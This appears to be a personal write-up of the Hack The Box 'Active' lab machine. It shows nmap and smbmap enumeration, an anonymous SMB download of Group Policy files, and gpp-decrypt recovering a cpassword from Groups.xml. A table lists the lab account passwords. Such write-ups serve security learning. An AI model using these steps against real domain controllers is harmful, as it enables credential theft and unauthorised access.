<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>
 | 
</title>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">

<meta name="generator" content="Hugo 0.127.0">


<link rel="canonical" href="http://localhost:1313/posts/active---htb/" >




<link href="/css/style.min.d23c1980faa61c0d6b331a0cd9dbc34fb7dade9e294067f1108fb8f26bd7796c.css" rel="stylesheet">




</head>

<body>

    <div class="flexWrapper">
        <header class="headerWrapper">
    <div class="header">
        <div>
            <a class="terminal" href="http://localhost:1313/">
                <span>@ ~ $</span>
            </a>
        </div>
        <input class="side-menu" type="checkbox" id="side-menu">
        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
        <nav class="headerLinks">
            <ul>
                
            </ul>
        </nav>
    </div>
</header>


        <div class="content">
            <main class="main">
                
<div class="postWrapper">
    <h1></h1>
    
    
    <section class="postMetadata">
        <dl>
            
            
            
            
                <dt>published</dt>
                
                <dd><time datetime="0001-01-01">January 1, 1</time></dd>
            
            
                <dt>reading time</dt>
                <dd>4 minutes</dd>
            
        </dl>
    </section>
    
    <div>
        <h1 id="active">Active</h1>
<p>Tags: Easy, Tj Null, Windows
start Date: February 19, 2024
End Date : February 20, 2024
Status: Done</p>
<table>
<thead>
<tr>
<th>svg_tgs</th>
<th>GPPstillStandingStrong2k18</th>
</tr>
</thead>
<tbody>
<tr>
<td>Administrator</td>
<td>Ticketmaster1968</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="tools">Tools</h2>
<ol>
<li>Nmap</li>
<li>smbmap</li>
</ol>
<hr>
<p>Nmap Scan</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>Desktop<span style="color:#f92672">/</span>HTB<span style="color:#f92672">/</span>BLocky]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> nmap <span style="color:#f92672">-</span>sV <span style="color:#f92672">-</span>sC <span style="color:#ae81ff">10.10.10.100</span>                    
</span></span><span style="display:flex;"><span>Starting Nmap <span style="color:#ae81ff">7.94</span>SVN ( https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">02</span><span style="color:#f92672">-</span><span style="color:#ae81ff">26</span> <span style="color:#ae81ff">11</span>:<span style="color:#ae81ff">22</span> EST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.100</span>
</span></span><span style="display:flex;"><span>Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.16</span>s latency)<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">982</span> closed tcp ports (conn<span style="color:#f92672">-</span>refused)
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">53</span><span style="color:#f92672">/</span>tcp    open  domain        Microsoft DNS <span style="color:#ae81ff">6.1.7601</span> (<span style="color:#ae81ff">1</span>DB15D39) (Windows Server <span style="color:#ae81ff">2008</span> R2 SP1)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> dns<span style="color:#f92672">-</span>nsid: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  bind<span style="color:#f92672">.</span>version: Microsoft DNS <span style="color:#ae81ff">6.1.7601</span> (<span style="color:#ae81ff">1</span>DB15D39)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>tcp    open  kerberos<span style="color:#f92672">-</span>sec  Microsoft Windows Kerberos (server time: <span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">02</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">14</span>Z)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp   open  netbios<span style="color:#f92672">-</span>ssn   Microsoft Windows netbios<span style="color:#f92672">-</span>ssn
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">389</span><span style="color:#f92672">/</span>tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active<span style="color:#f92672">.</span>htb, Site: Default<span style="color:#f92672">-</span>First<span style="color:#f92672">-</span>Site<span style="color:#f92672">-</span>Name)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds<span style="color:#960050;background-color:#1e0010">?</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">464</span><span style="color:#f92672">/</span>tcp   open  kpasswd5<span style="color:#960050;background-color:#1e0010">?</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">593</span><span style="color:#f92672">/</span>tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span style="color:#ae81ff">1.0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">636</span><span style="color:#f92672">/</span>tcp   open  tcpwrapped
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3268</span><span style="color:#f92672">/</span>tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active<span style="color:#f92672">.</span>htb, Site: Default<span style="color:#f92672">-</span>First<span style="color:#f92672">-</span>Site<span style="color:#f92672">-</span>Name)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3269</span><span style="color:#f92672">/</span>tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49152</span><span style="color:#f92672">/</span>tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49153</span><span style="color:#f92672">/</span>tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49154</span><span style="color:#f92672">/</span>tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49155</span><span style="color:#f92672">/</span>tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49157</span><span style="color:#f92672">/</span>tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span style="color:#ae81ff">1.0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49158</span><span style="color:#f92672">/</span>tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49165</span><span style="color:#f92672">/</span>tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:<span style="color:#f92672">/</span>o:microsoft:windows_server_2008:r2:sp1, cpe:<span style="color:#f92672">/</span>o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> smb2<span style="color:#f92672">-</span>security<span style="color:#f92672">-</span>mode: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">1</span>:<span style="color:#ae81ff">0</span>: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_    Message signing enabled <span style="color:#f92672">and</span> required
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> smb2<span style="color:#f92672">-</span>time: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   date: <span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">02</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span>T15:<span style="color:#ae81ff">24</span>:<span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  start_date: <span style="color:#ae81ff">2024</span><span style="color:#f92672">-</span><span style="color:#ae81ff">02</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span>T13:<span style="color:#ae81ff">22</span>:<span style="color:#ae81ff">17</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed<span style="color:#f92672">.</span> Please report any incorrect results at https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> <span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#f92672">in</span> <span style="color:#ae81ff">99.40</span> seconds
</span></span></code></pre></div><p>Added <code>10.10.10.100 active.htb</code> to <code>/etc/hosts</code> file so that we can get the domain easily.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─$</span> smbmap <span style="color:#f92672">-</span>H <span style="color:#ae81ff">10.10.10.100</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">/</span><span style="color:#e6db74">&#34;       )|&#34;</span>  \    <span style="color:#f92672">/</span><span style="color:#e6db74">&#34;  ||   _  &#34;</span>\ <span style="color:#f92672">|</span><span style="color:#e6db74">&#34;  \    /&#34;</span>  <span style="color:#f92672">|</span>     <span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&#34;</span>\       <span style="color:#f92672">|</span>   __ <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span>
</span></span><span style="display:flex;"><span>   \___  \    <span style="color:#f92672">/</span>\  \<span style="color:#f92672">/.</span>    <span style="color:#f92672">||</span>:     \<span style="color:#f92672">/</span>   <span style="color:#f92672">/</span>\   \<span style="color:#f92672">/.</span>    <span style="color:#f92672">|</span>   <span style="color:#f92672">/</span><span style="color:#e6db74">&#39; /\  \     |:  ____/</span>
</span></span><span style="display:flex;"><span>    __<span style="color:#f92672">/</span>  \   <span style="color:#f92672">|</span>: \<span style="color:#f92672">.</span>        <span style="color:#f92672">|</span>(<span style="color:#f92672">|</span>  _  \  <span style="color:#f92672">|</span>: \<span style="color:#f92672">.</span>        <span style="color:#f92672">|</span>  <span style="color:#f92672">//</span>  __<span style="color:#e6db74">&#39;  \    (|  /</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">/</span><span style="color:#e6db74">&#34; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ </span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-----------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>     SMBMap <span style="color:#f92672">-</span> Samba Share Enumerator <span style="color:#f92672">|</span> Shawn Evans <span style="color:#f92672">-</span> ShawnDEvans<span style="color:#a6e22e">@gmail.com</span>
</span></span><span style="display:flex;"><span>                     https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>ShawnDEvans<span style="color:#f92672">/</span>smbmap
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Detected <span style="color:#ae81ff">1</span> hosts serving SMB
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Established <span style="color:#ae81ff">1</span> SMB session(s)                                
</span></span><span style="display:flex;"><span>                                                                                                    
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] IP: <span style="color:#ae81ff">10.10.10.100</span>:<span style="color:#ae81ff">445</span>	Name: active<span style="color:#f92672">.</span>htb          	Status: Authenticated
</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">----</span>                                                  	<span style="color:#f92672">-----------</span>	<span style="color:#f92672">-------</span>
</span></span><span style="display:flex;"><span>	ADMIN<span style="color:#960050;background-color:#1e0010">$</span>                                            	NO ACCESS	Remote Admin
</span></span><span style="display:flex;"><span>	C<span style="color:#960050;background-color:#1e0010">$</span>                                                	NO ACCESS	Default share
</span></span><span style="display:flex;"><span>	IPC<span style="color:#960050;background-color:#1e0010">$</span>                                              	NO ACCESS	Remote IPC
</span></span><span style="display:flex;"><span>	NETLOGON                                          	NO ACCESS	Logon server share 
</span></span><span style="display:flex;"><span>	Replication                                       	READ ONLY	
</span></span><span style="display:flex;"><span>	SYSVOL                                            	NO ACCESS	Logon server share 
</span></span><span style="display:flex;"><span>	Users                                             	NO ACCESS
</span></span></code></pre></div><p>I have run smbmap and saw files which are shared and now I have downloaded files in Replicate</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~</span>]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> smbclient <span style="color:#f92672">//</span><span style="color:#ae81ff">10.10.10.100</span><span style="color:#f92672">/</span>Replication                
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> [WORKGROUP\kali]:
</span></span><span style="display:flex;"><span>Anonymous login successful
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>smb: \<span style="color:#f92672">&gt;</span> RECURSE ON
</span></span><span style="display:flex;"><span>smb: \<span style="color:#f92672">&gt;</span> PROMPT OFF
</span></span><span style="display:flex;"><span>smb: \<span style="color:#f92672">&gt;</span> mget <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}\GPT<span style="color:#f92672">.</span>INI of size <span style="color:#ae81ff">23</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}<span style="color:#f92672">/</span>GPT<span style="color:#f92672">.</span>INI (<span style="color:#ae81ff">0.0</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.0</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">6</span>AC1786C<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04fB984F9}\GPT<span style="color:#f92672">.</span>INI of size <span style="color:#ae81ff">22</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">6</span>AC1786C<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04fB984F9}<span style="color:#f92672">/</span>GPT<span style="color:#f92672">.</span>INI (<span style="color:#ae81ff">0.0</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.0</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}\Group Policy\GPE<span style="color:#f92672">.</span>INI of size <span style="color:#ae81ff">119</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}<span style="color:#f92672">/</span>Group Policy<span style="color:#f92672">/</span>GPE<span style="color:#f92672">.</span>INI (<span style="color:#ae81ff">0.2</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.1</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}\MACHINE\Registry<span style="color:#f92672">.</span>pol of size <span style="color:#ae81ff">2788</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}<span style="color:#f92672">/</span>MACHINE<span style="color:#f92672">/</span>Registry<span style="color:#f92672">.</span>pol (<span style="color:#ae81ff">3.1</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">1.0</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}\MACHINE\Preferences\Groups\Groups<span style="color:#f92672">.</span>xml of size <span style="color:#ae81ff">533</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}<span style="color:#f92672">/</span>MACHINE<span style="color:#f92672">/</span>Preferences<span style="color:#f92672">/</span>Groups<span style="color:#f92672">/</span>Groups<span style="color:#f92672">.</span>xml (<span style="color:#ae81ff">0.3</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.7</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl<span style="color:#f92672">.</span>inf of size <span style="color:#ae81ff">1098</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}<span style="color:#f92672">/</span>MACHINE<span style="color:#f92672">/</span>Microsoft<span style="color:#f92672">/</span>Windows NT<span style="color:#f92672">/</span>SecEdit<span style="color:#f92672">/</span>GptTmpl<span style="color:#f92672">.</span>inf (<span style="color:#ae81ff">0.3</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.6</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>getting file \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">6</span>AC1786C<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl<span style="color:#f92672">.</span>inf of size <span style="color:#ae81ff">3722</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">6</span>AC1786C<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04fB984F9}<span style="color:#f92672">/</span>MACHINE<span style="color:#f92672">/</span>Microsoft<span style="color:#f92672">/</span>Windows NT<span style="color:#f92672">/</span>SecEdit<span style="color:#f92672">/</span>GptTmpl<span style="color:#f92672">.</span>inf (<span style="color:#ae81ff">3.9</span> KiloBytes<span style="color:#f92672">/</span>sec) (average <span style="color:#ae81ff">0.9</span> KiloBytes<span style="color:#f92672">/</span>sec)
</span></span><span style="display:flex;"><span>smb: 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~</span>]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> cat \active<span style="color:#f92672">.</span>htb\Policies\{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}\MACHINE\Preferences\Groups\Groups<span style="color:#f92672">.</span>xml of size <span style="color:#ae81ff">533</span> <span style="color:#66d9ef">as</span> active<span style="color:#f92672">.</span>htb<span style="color:#f92672">/</span>Policies<span style="color:#f92672">/</span>{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}<span style="color:#f92672">/</span>MACHINE<span style="color:#f92672">/</span>Preferences<span style="color:#f92672">/</span>Groups<span style="color:#f92672">/</span>Groups<span style="color:#f92672">.</span>xml
</span></span><span style="display:flex;"><span>cat: active<span style="color:#f92672">.</span>htbPolicies{<span style="color:#ae81ff">31</span>B2F340<span style="color:#f92672">-</span><span style="color:#ae81ff">016</span>D<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>D2<span style="color:#f92672">-</span><span style="color:#ae81ff">945</span>F<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span>C04FB984F9}MACHINEPreferencesGroupsGroups<span style="color:#f92672">.</span>xml: No such file <span style="color:#f92672">or</span> directory
</span></span><span style="display:flex;"><span>cat: of: No such file <span style="color:#f92672">or</span> directory
</span></span><span style="display:flex;"><span>cat: size: No such file <span style="color:#f92672">or</span> directory
</span></span><span style="display:flex;"><span>cat: <span style="color:#ae81ff">533</span>: No such file <span style="color:#f92672">or</span> directory
</span></span><span style="display:flex;"><span>cat: <span style="color:#66d9ef">as</span>: No such file <span style="color:#f92672">or</span> directory
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">?</span>xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>Groups clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span style="color:#f92672">&gt;&lt;</span>User clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> changed<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> uid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span style="color:#f92672">&gt;&lt;</span>Properties action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U&#34;</span> newName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> fullName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> changeLogon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> noChange<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> neverExpires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> acctDisabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span><span style="color:#f92672">/&gt;&lt;/</span>User<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>Groups<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(kali<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">~</span>]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> gpp<span style="color:#f92672">-</span>decrypt edBSHOwhZLTjt<span style="color:#f92672">/</span>QS9FeIcJ83mjWA98gw9guKOhJOdcqh<span style="color:#f92672">+</span>ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw<span style="color:#f92672">/</span>NglVmQ
</span></span><span style="display:flex;"><span>GPPstillStandingStrong2k18
</span></span></code></pre></div><p><img src="Active%20d4d590c8848a46b9b7fecc86ca03280f/Untitled.png" alt="Untitled"></p>
